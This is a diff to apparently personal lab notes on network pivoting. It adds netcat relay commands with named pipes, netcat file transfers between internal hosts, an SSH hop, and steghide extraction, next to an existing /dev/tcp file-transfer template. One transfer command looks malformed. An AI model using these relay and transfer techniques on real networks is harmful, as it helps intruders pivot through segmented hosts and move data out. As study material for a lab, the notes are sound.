@@ -1042,5 +1042,28 @@ have the ip address
 ####  File Tranfer via /DEV/TCP
 	/dev/tcp/<ip>/<port>
 	
+### Task
+#### Relay 1
+
+<details>
+
+	T1: Int-Host : 10.10.0.40 outside ip
+ 		Relay
+   			nc -lvvp 1234 0<relay1 | nc -lvvp 1234 1>relay1 # make netcat relay listnening on the port 1234 specified
+		Get file from T2 to Host
+  			nc -lp 5555 > 1steg.jp
+     			steghide extract -sf 1steg.jp
+  			cat phrase1.txt | md5sum
+  	
+  	T2: Relay : 172.16.40.10 : Blue-Int-Dmz-Host-4 
+		Relay  		
+     			T1: ssh into 172.16.40.10
+	    		nc -lp 1234 >1steg.jpg
+      		Get file to Host
+			nc -lp 10.10.0.40 5555 < 1steg.jpg
+   		
+ 	T3: 172.16.82.115 : BLUE_HOST-4
+  		No Creds
+</details>
 
 </details>
